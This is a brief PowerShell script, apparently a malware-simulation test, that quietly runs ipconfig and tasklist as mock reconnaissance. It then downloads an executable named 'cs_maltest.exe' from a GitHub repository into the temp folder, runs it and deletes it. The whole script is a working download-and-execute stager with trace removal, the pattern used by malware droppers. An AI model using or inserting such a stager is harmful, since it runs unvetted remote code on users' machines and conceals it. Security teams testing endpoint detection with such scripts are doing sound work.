cd $env:temp
ipconfig /all | Out-Null
tasklist | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
(New-Object System.Net.WebClient).DownloadFile('https://github.com/igata-f/cstest/raw/master/cs_maltest.exe', "$env:temp"+'/cs_maltest.exe')
.\cs_maltest.exe
Remove-Item cs_maltest.exe
